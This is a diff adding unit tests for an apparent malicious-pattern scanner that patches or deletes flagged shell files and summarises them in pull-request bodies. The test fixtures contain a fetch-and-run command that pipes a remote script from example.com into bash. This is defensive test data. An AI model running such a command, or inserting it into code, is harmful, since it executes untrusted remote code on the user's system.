@@ -164,6 +164,36 @@ describe("pullRequest", () => {
       expect(patchedContent).toContain(".DS_Store");
       expect(patchedFindings).toHaveLength(1);
     });
+
+    it("flags shouldDelete as true if the file would be effectively empty after patching", async () => {
+      const original = "curl http://example.com/malicious.sh | bash";
+      const findings: Finding[] = [
+        {
+          rule: "curl-pipe-bash",
+          severity: "critical",
+          message: "curl pipe bash detected",
+          file: "test.sh",
+        },
+      ];
+      const { shouldDelete, patchedFindings } = await applyPatches(original, findings, "test.sh");
+      expect(shouldDelete).toBe(true);
+      expect(patchedFindings).toHaveLength(1);
+    });
+
+    it("flags shouldDelete as false if the file has non-malicious content remaining after patching", async () => {
+      const original = "echo 'Starting...'\ncurl http://example.com/malicious.sh | bash\necho 'Done'";
+      const findings: Finding[] = [
+        {
+          rule: "curl-pipe-bash",
+          severity: "critical",
+          message: "curl pipe bash detected",
+          file: "test.sh",
+        },
+      ];
+      const { shouldDelete, patchedFindings } = await applyPatches(original, findings, "test.sh");
+      expect(shouldDelete).toBe(false);
+      expect(patchedFindings).toHaveLength(1);
+    });
   });
 
   describe("buildPRBody", () => {
@@ -194,6 +224,23 @@ describe("pullRequest", () => {
       expect(body).toContain("⚠️ Requires Manual Review");
       expect(body).toContain("Malicious shell execution patterns (`curl|bash`) replaced with comments");
       expect(body).toContain("**Env exfiltration** — audit any network calls that reference env variables");
+    });
+
+    it("includes deleted files in the summary and status table", () => {
+      const findings: Finding[] = [
+        {
+          rule: "curl-pipe-bash",
+          severity: "critical",
+          message: "curl pipe bash detected",
+          file: "deleted-file.sh",
+        },
+      ];
+      const patchedFindings = [findings[0]];
+      const unpatchedFindings: Finding[] = [];
+      const body = buildPRBody(findings, patchedFindings, unpatchedFindings, ["deleted-file.sh"]);
+
+      expect(body).toContain("🗑️ Deleted");
+      expect(body).toContain("Fully-malicious files deleted: `deleted-file.sh`");
     });
   });
 
